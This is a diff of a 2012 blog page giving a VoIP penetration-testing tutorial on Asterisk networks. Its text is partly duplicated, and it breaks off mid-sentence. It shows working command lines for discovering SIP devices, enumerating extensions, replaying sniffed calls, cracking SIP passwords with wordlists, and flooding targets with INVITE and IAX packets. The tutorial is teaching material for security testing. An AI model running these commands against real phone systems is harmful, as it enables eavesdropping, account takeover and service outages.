@@ -1,155 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>VoIP渗透测试 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>VoIP渗透测试 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="VoIP or voice over IP (Internet protocol) is a transmission mode designed for use in voice and multimedia communications. As IP (Internet protocol)-based networks like the Internet seem to be most successful communications infrastructure, the traditional telephone network is currently being replaced VoIP. Nowadays, its clear improvements and advantages over the old systems make it a popular substitute, with a number of advantages. Among them:  The low cost of VoIP as compared to a traditional telephone network. There are any number of services available free of cost (like Skype) that allow you to communicate over distances long or short, PC-to-PC and free of cost.  VoIP is portable. Portability and mobility is another advantage of VoIP over traditional telephone; you only need an Internet connection for communication.  VoIP service includes a number of different advanced features not normally available with traditional telephone service, including call forwarding, conference call, caller ID, virtual numbers and more.  The advantages are many but this is not our main topic of discussion. (Likewise, there are a number of disadvantages, too: VoIP services depend on Internet connection speed; voice quality depends on the performance of your computer, and so forth). So what is our point in discussing this? What we examine here will be the security aspect of VoIP. In this article, we will review:  An overview of VoIP   What is Asterisk? (and what are the functionalities)   What is Trixbox?   VoIP hacking (Penetration testing on an asterisk based network)  With so many aforementioned advantages, VoIP is gaining popularity among both organizations and private users alike. But what about the security issues? As should be entirely predictable, any new technology immediately presents opportunities for those seeking to cause mischief. This is confirmed by reports I’m sure you’ve heard about: not just the phone hacking scandal in Britain, but the hacking in which thieves easily steal confidential information from a victim because their network was not secure.  If you are a pen tester or ethical hacker, then you have an idea about the importance of penetration testing in VoIP, because most of the important communications going on today occur on VoIP and securing confidential information is therefore critical. We will do some practical penetration testing on a VoIP-based network, but first of all I will show you how to build it.  Asterisk is an open-source software that can turn your computer into a communications server. There’s an asterisk software for PBX (private branch exchange) that allows you to make calls and transfer your data.  Trixbox is a wonderful software (or PBX: private branch exchange), based on the asterisk project. It was formally known as but in October 2006 it was renamed Trixbox. The difference between trixbox with other PBX is that trixbox is based on IP (Internet protocol) and has been designed for small and medium sized businesses. There are mainly two version of trixbox available: one is Trixbox CE (a free and open source), while the other – called Trixbox Pro – is one that you will need to purchase.  Protocols &amp;amp; Ports  You must have an idea about the protocols and their ports before attempting to launch actual penetration testing on a VoIP network.  SIP (or session initiation protocol) has been defined by Internet Engineering Task Force (IETF) as the protocol for VoIP communication (in other words: a signaling protocol). SIP uses port 5060 and 5061 for both TCP and UDP.  SDP or session description protocol is for multimedia communications, while MGCP (media gateway control protocol) uses port number 2427 and 2727 for UDP.  RTP (real-time transfer protocol) defines the packets to deliver videos and audios on IP based network like VoIP. RTCP (RTP control protocol) is just like RTP, and it is used to structure the packets that are defined by RTP.  IAX (Inter-Asterisk eXchange) is an important protocol used in the asterisk system and is supported by a different soft-phone and PBX. IAX2 is the second version of IAX and works on the UDP port number 4569.  VoIP Penetration Testing  The process of penetration testing on a VoIP network is generally the same as the penetration testing on any other network. All we need to do is to follow the general guidelines, starting with information gathering, as we would with any form of penetration testing. We will do the same on VoIP network.">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="VoIP渗透测试 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/507.seo/" title="VoIP渗透测试" itemprop="url">VoIP渗透测试</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2012-06-12T10:28:08.000Z" itemprop="datePublished">2012-06-12</time>
+    Updated:<time datetime="2016-08-20T11:03:53.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p>VoIP or voice over IP (Internet protocol) is a transmission mode designed for use in voice and multimedia communications. As IP (Internet protocol)-based networks like the Internet seem to be most successful communications infrastructure, the traditional telephone network is currently being replaced VoIP. Nowadays, its clear improvements and advantages over the old systems make it a popular substitute, with a number of advantages. Among them:</p>  <p>The low cost of VoIP as compared to a traditional telephone network. There are any number of services available free of cost (like Skype) that allow you to communicate over distances long or short, PC-to-PC and free of cost.</p>  <p>VoIP is portable. Portability and mobility is another advantage of VoIP over traditional telephone; you only need an Internet connection for communication.</p>  <p>VoIP service includes a number of different advanced features not normally available with traditional telephone service, including call forwarding, conference call, caller ID, virtual numbers and more.</p>  <p>The advantages are many but this is not our main topic of discussion. (Likewise, there are a number of disadvantages, too: VoIP services depend on Internet connection speed; voice quality depends on the performance of your computer, and so forth). So what is our point in discussing this? What we examine here will be the security aspect of VoIP. In this article, we will review:</p>  <p>An overview of VoIP </p>  <p>What is Asterisk? (and what are the functionalities) </p>  <p>What is Trixbox? </p>  <p>VoIP hacking (Penetration testing on an asterisk based network)</p>  <p>With so many aforementioned advantages, VoIP is gaining popularity among both organizations and private users alike. But what about the security issues? As should be entirely predictable, any new technology immediately presents opportunities for those seeking to cause mischief. This is confirmed by reports I’m sure you’ve heard about: not just the phone hacking scandal in Britain, but the hacking in which thieves easily steal confidential information from a victim because their network was not secure.</p>  <p>If you are a pen tester or ethical hacker, then you have an idea about the importance of penetration testing in VoIP, because most of the important communications going on today occur on VoIP and securing confidential information is therefore critical. We will do some practical penetration testing on a VoIP-based network, but first of all I will show you how to build it.</p>  <p>Asterisk is an open-source software that can turn your computer into a communications server. There’s an asterisk software for PBX (private branch exchange) that allows you to make calls and transfer your data.</p>  <p>Trixbox is a wonderful software (or PBX: private branch exchange), based on the asterisk project. It was formally known as but in October 2006 it was renamed Trixbox. The difference between trixbox with other PBX is that trixbox is based on IP (Internet protocol) and has been designed for small and medium sized businesses. There are mainly two version of trixbox available: one is Trixbox CE (a free and open source), while the other – called Trixbox Pro – is one that you will need to purchase.</p>  <p>Protocols &amp; Ports</p>  <p>You must have an idea about the protocols and their ports before attempting to launch actual penetration testing on a VoIP network.</p>  <p>SIP (or session initiation protocol) has been defined by Internet Engineering Task Force (IETF) as the protocol for VoIP communication (in other words: a signaling protocol). SIP uses port 5060 and 5061 for both TCP and UDP.</p>  <p>SDP or session description protocol is for multimedia communications, while MGCP (media gateway control protocol) uses port number 2427 and 2727 for UDP.</p>  <p>RTP (real-time transfer protocol) defines the packets to deliver videos and audios on IP based network like VoIP. RTCP (RTP control protocol) is just like RTP, and it is used to structure the packets that are defined by RTP.</p>  <p>IAX (Inter-Asterisk eXchange) is an important protocol used in the asterisk system and is supported by a different soft-phone and PBX. IAX2 is the second version of IAX and works on the UDP port number 4569.</p>  <p>VoIP Penetration Testing</p>  <p>The process of penetration testing on a VoIP network is generally the same as the penetration testing on any other network. All we need to do is to follow the general guidelines, starting with information gathering, as we would with any form of penetration testing. We will do the same on VoIP network.</p><a id="more"></a><p></p>  <p>Let’s consider a simple scenario: you have found an asterisk-based PBX while doing a penetration test on a network, like the nmap result showing below:</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[6]" border="0" alt="clip_image002[6]" src="http://img.cker.in/VoIP_227F/clip_image0026.jpg" width="586" height="331"></p>  <p>It might be some sort of VoIP server, so a smart penetration tester would use the available tools to learn more about this server. Therefore, in this section I will discuss some of the tools and their usage that will be really helpful in VoIP penetration testing.</p>  <p>SMAP</p>  <p>SMAP is a wonderful scanner that has the ability to detect SIP-enabled devices (it can find a single IP or a range of IPs, to all the subnets) and can locate any VoIP server within an operating system. So it will help to understand the VoIP network.</p>  <p>root@bt:/pentest/voip/smap# ./smap 192.168.1.9</p>  <p>smap 0.6.0 &lt;hs@123.org&gt; <a href="http://www.wormulon.net/" target="_blank" rel="external">http://www.wormulon.net/</a></p>  <p></p>  <p>192.168.1.9: ICMP reachable, SIP enabled</p>  <p>1 host scanned, 1 ICMP reachable, 1 SIP enabled (100.0%)</p>  <p>It shows that this host is a VoIP server. Let’s try to gather more information.</p>  <p>root@bt:/pentest/voip/smap# ./smap -O 192.168.1.9</p>  <p>smap 0.6.0 &lt;hs@123.org&gt; <a href="http://www.wormulon.net/" target="_blank" rel="external">http://www.wormulon.net/</a></p>  <p>192.168.1.9: ICMP reachable, SIP enabled</p>  <p>best guess (55% sure) fingerprint:</p>  <p>Asterisk PBX (unknown version)</p>  <p>User-Agent: Asterisk PBX 1.6.0.26-FONCORE-r78</p>  <p>1 host scanned, 1 ICMP reachable, 1 SIP enabled (100.0%)</p>  <p>-l: fingerprint learning mode</p>  <p>. It is a wonderful argument that will give us more information.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[8]" border="0" alt="clip_image002[8]" src="http://img.cker.in/VoIP_227F/clip_image0028.jpg" width="506" height="294"></p>  <p>SIP-Scan</p>  <p>It is just like the SMAP, in that an SIP-scan is also used to detect SIP-enabled devices. Likewise, it has the ability to scan over the entire range of IPs.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[6]" border="0" alt="clip_image004[6]" src="http://img.cker.in/VoIP_227F/clip_image0046.jpg" width="669" height="266"></p>  <p></p>  <p>root@bt:/pentest/voip/sipscan# ./sip-scan -i eth0 192.168.1.1-254</p>  <p>192.168.1.9: Asterisk PBX 1.6.0.26-FONCORE-r78</p>  <p>root@bt:/pentest/voip/sipscan#</p>  <p>SIPvicious</p>  <p>SIPvicious is a collection of multiple tools (or a tool suite) containing several wonderful implements for VoIP penetration testing purposes. We will discuss the most important – and their usage – in this section.</p>  <p>Svmap</p>  <p>This is a part of the SIPvicious suite. Svmap is a SIP scanner that can scan for SIP-enabled devices within a network. An example to find a VoIP server in a network is shown below.</p>  <p>root@bt:/pentest/voip/sipvicious# ./svmap.py 192.168.1.1/24</p>  <p>| SIP Device | User Agent | Fingerprint |</p>  <p>————————————————————————————————-</p>  <p>| 192.168.1.9:5060 | Asterisk PBX 1.6.0.26-FONCORE-r78 | Asterisk / SJphone/1.60.289a (SJ Labs) |</p>  <p>root@bt:/pentest/voip/sipvicious#</p>  <p>Extensions Enumeration</p>  <p>Extensions are the devices (may be a phone or desktop computer) that can make calls. Simple extensions are at the end node and connected with the VoIP server to transfer the data. So we need to locate the numbers used to transfer data in order to enumerate on the network further.</p>  <p><a name="Svwar"></a>Svwar</p>  <p>Svwar is part of the SIPvicious tool suite. It’s used to detect the end user (extensions) on a PBX.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[10]" border="0" alt="clip_image002[10]" src="http://img.cker.in/VoIP_227F/clip_image00210.jpg" width="669" height="125"></p>  <p>root@bt:/pentest/voip/sipvicious# ./svwar.py -e100-700 192.168.1.9</p>  <p>| Extension | Authentication |</p>  <p>——————————</p>  <p>| 500 | reqauth |</p>  <p>| 600 | reqauth |</p>  <p>Here -e100-700 defines the possible range of extensions.</p>  <p>Now, after doing just a little work, we have a lot of information about this VoIP network. We can now easily develop the network topology (these documents are included in the final report).</p>  <p>Here is the network diagram that I have created, based on the information that we have gathered in the above steps.</p>  <p></p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[12]" border="0" alt="clip_image002[12]" src="http://img.cker.in/VoIP_227F/clip_image00212.jpg" width="669" height="303"></p>  <p>Sniffing on VoIP Network</p>  <p>The concept of sniffing in VoIP network is the same as a general network sniffing concept. I will use some of the most famous tools to demonstrate the sniffing attack on VoIP network. Let us start with Wireshark, which is able to capture VoIP traffic.</p>  <p>Now let’s suppose the end users (extensions) are busy communicating with each other, and that an attacker is trying to capture some traffic so that he/she will able to get the data (their communication).</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[8]" border="0" alt="clip_image004[8]" src="http://img.cker.in/VoIP_227F/clip_image0048.jpg" width="669" height="198"></p>  <p>Wireshark has captured some traffic. As discussed above on the protocol section, RTP contains the information. The question now is: how do we extract information from these packets? Wireshark provides the option to extract the information with a built-in feature for VoIP. Click on the telephony tab – VoIP calls you. You will then get this window:</p>  <p></p>  <p>VoIP or voice over IP (Internet protocol) is a transmission mode designed for use in voice and multimedia communications. As IP (Internet protocol)-based networks like the Internet seem to be most successful communications infrastructure, the traditional telephone network is currently being replaced VoIP. Nowadays, its clear improvements and advantages over the old systems make it a popular substitute, with a number of advantages. Among them:</p>  <p>The low cost of VoIP as compared to a traditional telephone network. There are any number of services available free of cost (like Skype) that allow you to communicate over distances long or short, PC-to-PC and free of cost.</p>  <p>VoIP is portable. Portability and mobility is another advantage of VoIP over traditional telephone; you only need an Internet connection for communication.</p>  <p>VoIP service includes a number of different advanced features not normally available with traditional telephone service, including call forwarding, conference call, caller ID, virtual numbers and more.</p>  <p>The advantages are many but this is not our main topic of discussion. (Likewise, there are a number of disadvantages, too: VoIP services depend on Internet connection speed; voice quality depends on the performance of your computer, and so forth). So what is our point in discussing this? What we examine here will be the security aspect of VoIP. In this article, we will review:</p>  <p>An overview of VoIP </p>  <p>What is Asterisk? (and what are the functionalities) </p>  <p>What is Trixbox? </p>  <p>VoIP hacking (Penetration testing on an asterisk based network)</p>  <p>With so many aforementioned advantages, VoIP is gaining popularity among both organizations and private users alike. But what about the security issues? As should be entirely predictable, any new technology immediately presents opportunities for those seeking to cause mischief. This is confirmed by reports I’m sure you’ve heard about: not just the phone hacking scandal in Britain, but the hacking in which thieves easily steal confidential information from a victim because their network was not secure.</p>  <p>If you are a pen tester or ethical hacker, then you have an idea about the importance of penetration testing in VoIP, because most of the important communications going on today occur on VoIP and securing confidential information is therefore critical. We will do some practical penetration testing on a VoIP-based network, but first of all I will show you how to build it.</p>  <p>Asterisk is an open-source software that can turn your computer into a communications server. There’s an asterisk software for PBX (private branch exchange) that allows you to make calls and transfer your data.</p>  <p>Trixbox is a wonderful software (or PBX: private branch exchange), based on the asterisk project. It was formally known as but in October 2006 it was renamed Trixbox. The difference between trixbox with other PBX is that trixbox is based on IP (Internet protocol) and has been designed for small and medium sized businesses. There are mainly two version of trixbox available: one is Trixbox CE (a free and open source), while the other – called Trixbox Pro – is one that you will need to purchase.</p>  <p>Protocols &amp; Ports</p>  <p>You must have an idea about the protocols and their ports before attempting to launch actual penetration testing on a VoIP network.</p>  <p>SIP (or session initiation protocol) has been defined by Internet Engineering Task Force (IETF) as the protocol for VoIP communication (in other words: a signaling protocol). SIP uses port 5060 and 5061 for both TCP and UDP.</p>  <p>SDP or session description protocol is for multimedia communications, while MGCP (media gateway control protocol) uses port number 2427 and 2727 for UDP.</p>  <p>RTP (real-time transfer protocol) defines the packets to deliver videos and audios on IP based network like VoIP. RTCP (RTP control protocol) is just like RTP, and it is used to structure the packets that are defined by RTP.</p>  <p>IAX (Inter-Asterisk eXchange) is an important protocol used in the asterisk system and is supported by a different soft-phone and PBX. IAX2 is the second version of IAX and works on the UDP port number 4569.</p>  <p>VoIP Penetration Testing</p>  <p>The process of penetration testing on a VoIP network is generally the same as the penetration testing on any other network. All we need to do is to follow the general guidelines, starting with information gathering, as we would with any form of penetration testing. We will do the same on VoIP network.</p>  <p>Let’s consider a simple scenario: you have found an asterisk-based PBX while doing a penetration test on a network, like the nmap result showing below:</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[14]" border="0" alt="clip_image002[14]" src="http://img.cker.in/VoIP_227F/clip_image00214.jpg" width="586" height="331"></p>  <p>It might be some sort of VoIP server, so a smart penetration tester would use the available tools to learn more about this server. Therefore, in this section I will discuss some of the tools and their usage that will be really helpful in VoIP penetration testing.</p>  <p>SMAP</p>  <p>SMAP is a wonderful scanner that has the ability to detect SIP-enabled devices (it can find a single IP or a range of IPs, to all the subnets) and can locate any VoIP server within an operating system. So it will help to understand the VoIP network.</p>  <p>root@bt:/pentest/voip/smap# ./smap 192.168.1.9</p>  <p>smap 0.6.0 &lt;hs@123.org&gt; <a href="http://www.wormulon.net/" target="_blank" rel="external">http://www.wormulon.net/</a></p>  <p>192.168.1.9: ICMP reachable, SIP enabled</p>  <p>1 host scanned, 1 ICMP reachable, 1 SIP enabled (100.0%)</p>  <p>It shows that this host is a VoIP server. Let’s try to gather more information.</p>  <p>root@bt:/pentest/voip/smap# ./smap -O 192.168.1.9</p>  <p>smap 0.6.0 &lt;hs@123.org&gt; <a href="http://www.wormulon.net/" target="_blank" rel="external">http://www.wormulon.net/</a></p>  <p>192.168.1.9: ICMP reachable, SIP enabled</p>  <p>best guess (55% sure) fingerprint:</p>  <p>Asterisk PBX (unknown version)</p>  <p>User-Agent: Asterisk PBX 1.6.0.26-FONCORE-r78</p>  <p>1 host scanned, 1 ICMP reachable, 1 SIP enabled (100.0%)</p>  <p>-l: fingerprint learning mode</p>  <p>. It is a wonderful argument that will give us more information.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[10]" border="0" alt="clip_image004[10]" src="http://img.cker.in/VoIP_227F/clip_image00410.jpg" width="506" height="294"></p>  <p>SIP-Scan</p>  <p>It is just like the SMAP, in that an SIP-scan is also used to detect SIP-enabled devices. Likewise, it has the ability to scan over the entire range of IPs.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[6]" border="0" alt="clip_image006[6]" src="http://img.cker.in/VoIP_227F/clip_image0066.jpg" width="669" height="266"></p>  <p>root@bt:/pentest/voip/sipscan# ./sip-scan -i eth0 192.168.1.1-254</p>  <p>192.168.1.9: Asterisk PBX 1.6.0.26-FONCORE-r78</p>  <p>root@bt:/pentest/voip/sipscan#</p>  <p>SIPvicious</p>  <p>SIPvicious is a collection of multiple tools (or a tool suite) containing several wonderful implements for VoIP penetration testing purposes. We will discuss the most important – and their usage – in this section.</p>  <p>Svmap</p>  <p>This is a part of the SIPvicious suite. Svmap is a SIP scanner that can scan for SIP-enabled devices within a network. An example to find a VoIP server in a network is shown below.</p>  <p>root@bt:/pentest/voip/sipvicious# ./svmap.py 192.168.1.1/24</p>  <p>| SIP Device | User Agent | Fingerprint |</p>  <p>————————————————————————————————-</p>  <p>| 192.168.1.9:5060 | Asterisk PBX 1.6.0.26-FONCORE-r78 | Asterisk / SJphone/1.60.289a (SJ Labs) |</p>  <p>root@bt:/pentest/voip/sipvicious#</p>  <p>Extensions Enumeration</p>  <p>Extensions are the devices (may be a phone or desktop computer) that can make calls. Simple extensions are at the end node and connected with the VoIP server to transfer the data. So we need to locate the numbers used to transfer data in order to enumerate on the network further.</p>  <p><a name="Svwar"></a>Svwar</p>  <p>Svwar is part of the SIPvicious tool suite. It’s used to detect the end user (extensions) on a PBX.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[6]" border="0" alt="clip_image008[6]" src="http://img.cker.in/VoIP_227F/clip_image0086.jpg" width="669" height="125"></p>  <p>root@bt:/pentest/voip/sipvicious# ./svwar.py -e100-700 192.168.1.9</p>  <p>| Extension | Authentication |</p>  <p>——————————</p>  <p>| 500 | reqauth |</p>  <p>| 600 | reqauth |</p>  <p>Here -e100-700 defines the possible range of extensions.</p>  <p>Now, after doing just a little work, we have a lot of information about this VoIP network. We can now easily develop the network topology (these documents are included in the final report).</p>  <p>Here is the network diagram that I have created, based on the information that we have gathered in the above steps.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010[6]" border="0" alt="clip_image010[6]" src="http://img.cker.in/VoIP_227F/clip_image0106.jpg" width="669" height="303"></p>  <p>Sniffing on VoIP Network</p>  <p>The concept of sniffing in VoIP network is the same as a general network sniffing concept. I will use some of the most famous tools to demonstrate the sniffing attack on VoIP network. Let us start with Wireshark, which is able to capture VoIP traffic.</p>  <p>Now let’s suppose the end users (extensions) are busy communicating with each other, and that an attacker is trying to capture some traffic so that he/she will able to get the data (their communication).</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012[6]" border="0" alt="clip_image012[6]" src="http://img.cker.in/VoIP_227F/clip_image0126.jpg" width="669" height="198"></p>  <p>Wireshark has captured some traffic. As discussed above on the protocol section, RTP contains the information. The question now is: how do we extract information from these packets? Wireshark provides the option to extract the information with a built-in feature for VoIP. Click on the telephony tab – VoIP calls you. You will then get this window:</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014[6]" border="0" alt="clip_image014[6]" src="http://img.cker.in/VoIP_227F/clip_image0146.jpg" width="669" height="254"></p>  <p>Click on the player, then on the decode tab. You are now able to listen in to this communication and all of the data available in the audio file.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016[6]" border="0" alt="clip_image016[6]" src="http://img.cker.in/VoIP_227F/clip_image0166.jpg" width="669" height="354"></p>  <p>SIP Authentication Cracking (VoIP Cracking)</p>  <p>The importance of password is not a hidden truth, so in this section I will show you how to crack the password of any extension (user) on VoIP network. This attack is the most dangerous, because if an attacker know your password, then he/she will be able to authenticate on the network by using your identity.</p>  <p>The Wireshark result can be used for authentication cracking. Save the result into name.pcap; we will now use a wonderful tool called SIPcrack. It contains two scripts: one, sipdump, which will allow you to dump the authentication data into hashes; the second, sipcrack, which will help you to crack the VoIP password.</p>  <p>root@bt:~/Desktop/SIPcrack# ./sipdump pass.txt -p aa.pcap</p>  <p>SIPdump 0.3pre ( MaJoMu | www.codito.de )</p>  <p>—————————————</p>  <p><em> Using pcap file ‘aa.pcap’ for sniffing</em></p>  <p> Starting to sniff with packet filter ‘tcp or udp’</p>  <p><em> Dumped login from 192.168.1.9 -&gt; 192.168.1.3 (User: ‘600’)</em></p>  <p>Exiting, sniffed 1 logins</p>  <p>Sipcrack needs a wordlist to launch an attack. As a result, it will give you the password.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018[6]" border="0" alt="clip_image018[6]" src="http://img.cker.in/VoIP_227F/clip_image0186.jpg" width="669" height="370"></p>  <p>Another wonderful tool that will help you to crack the SIP password is svcrack. As with the others, it can be find under the tool suite of sipvicious. Svcrack is wonderful for brute force attacks on SIP accounts.</p>  <p>root@bt:/pentest/voip/sipvicious# ./svcrack.py -u600 -d list.txt 192.168.1.9</p>  <p>| Extension | Password |</p>  <p>————————</p>  <p>| 600 | 12345 |</p>  <p>Denial of Service Attack on VoIP Network</p>  <p>Denial of server (DOS) attack is a dangerous attack that can cause the VoIP network and devices to crash. Inviteflood is the tool used to launch DOS attacks against any extensions (user) on the VoIP network. Usage:   <table border="0" cellpadding="0"><tbody>       <tr>         <td>           <p>1</p>         </td>          <td>           <p>./inviteflood interface targetuser targetdomain floodtarget numberofpackets</p>         </td>       </tr>        <tr>         <td>           <p>2</p>         </td>          <td>           <p>./inviteflood eth0 600 192.168.1.3 192.168.1.3 200000</p>         </td>       </tr>     </tbody></table> </p>  <p>It seems to be a “ping of death” attack and it will crash the end user operating system, disabling the ability of he/she to make any calls.</p>  <p>Iaxflood is another a good tool that can flood the IAX2 protocol; the usage is very simple:</p>  <p>root@bt:/pentest/voip/iaxflood# ./iaxflood</p>  <p>usage: ./iaxflood sourcename destinationname numpackets</p>  <p>A simple usage like:</p>  <p>root@bt:/pentest/voip/iaxflood# ./iaxflood 192.168.1.13 192.168.1.2 10000</p>  <p>Will flood port 4569 from port 4569 10000 times</p>  <p>We have IP_HDRINCL</p>  <p>Number of Packets sent:</p>  <p>Sent 10000</p>  <p>root@bt:/pentest/voip/iaxflood#</p>  <p>Metasploit on VoIP Penetration Testing</p>  <p>Metasploit has a different auxiliary module for VoIP network. Here is the list of some best auxiliary modules of metasploit for VoIP hacking:</p>  <p>auxiliary/scanner/sip/options (To find the SIP enable devices)</p>  <p>auxiliary/scanner/sip/enumerator (To enumerate the extensions)</p>  <p>We can do basic VoIP network penetration testing by using metasploit auxiliary modules for information gathering and enumeration. We can scan an entire network to find the SIP enable devices, plus metasploit auxiliary modules are fast.</p>  <p>msf &gt; use auxiliary/scanner/sip/options</p>  <p>msf auxiliary(options) &gt; set RHOSTS 192.168.1.1/24</p>  <p>RHOSTS =&gt; 192.168.1.1/24</p>  <p>msf auxiliary(options) &gt; run</p>  <p>[] 192.168.1.3 sip:nobody@192.168.1.3 agent=’WAcjCpW’</p>  <p>[<em>] 192.168.1.9 200 agent=’Asterisk PBX 1.6.0.26-FONCORE-r78’ verbs=’INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO’</em></p>  <p>[] 192.168.1.9 200 agent=’Asterisk PBX 1.6.0.26-FONCORE-r78’ verbs=’INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO’</p>  <p>[<em>] Scanned 256 of 256 hosts (100% complete)</em></p>  <p>[] Auxiliary module execution completed</p>  <p>msf auxiliary(options) &gt;</p>  <p>VoIP Phishing</p>  <p>Security awareness is very important. Before concluding this article, I just want to briefly discuss VoIP phishing. Phishing is not a new attack – it is pretty old school – but it remains a threat because hackers usually use some social engineering technique to trick a user before stealing his/her credential information. You might have heard about email phishing, in which an attacker directs the victim to a fake page, so that they will enter their confidential information. In the same fashion, a hacker can hijack your calls to get your credential information.</p>  <p>Let’s suppose someone received a call or email like this:</p>  <p>“Hi, this is an urgent email (call) that has been generated by the network administrator. We have found something wrong with your account, so please call back at XXXX-XXXX-XXX to verify your account.” “</p>  <p>Typically, an unwary user will call back; the hacker may then ask for some confidential information. You need to understand the risk; educate people around you.</p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2012-06-12T10:28:08.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/渗透测试/'>渗透测试</a>,
-    
-    <a href='/tag/backtrack/'>backtrack</a>,
-    
-    <a href='/tag/VoIP渗透测试/'>VoIP渗透测试</a>
-    
-    
-</span>
-    <h1 class="post-title">VoIP渗透测试</h1>
-    <section class="post-content">
-      <p>VoIP or voice over IP (Internet protocol) is a transmission mode designed for use in voice and multimedia communications. As IP (Internet protocol)-based networks like the Internet seem to be most successful communications infrastructure, the traditional telephone network is currently being replaced VoIP. Nowadays, its clear improvements and advantages over the old systems make it a popular substitute, with a number of advantages. Among them:</p>  <p>The low cost of VoIP as compared to a traditional telephone network. There are any number of services available free of cost (like Skype) that allow you to communicate over distances long or short, PC-to-PC and free of cost.</p>  <p>VoIP is portable. Portability and mobility is another advantage of VoIP over traditional telephone; you only need an Internet connection for communication.</p>  <p>VoIP service includes a number of different advanced features not normally available with traditional telephone service, including call forwarding, conference call, caller ID, virtual numbers and more.</p>  <p>The advantages are many but this is not our main topic of discussion. (Likewise, there are a number of disadvantages, too: VoIP services depend on Internet connection speed; voice quality depends on the performance of your computer, and so forth). So what is our point in discussing this? What we examine here will be the security aspect of VoIP. In this article, we will review:</p>  <p>An 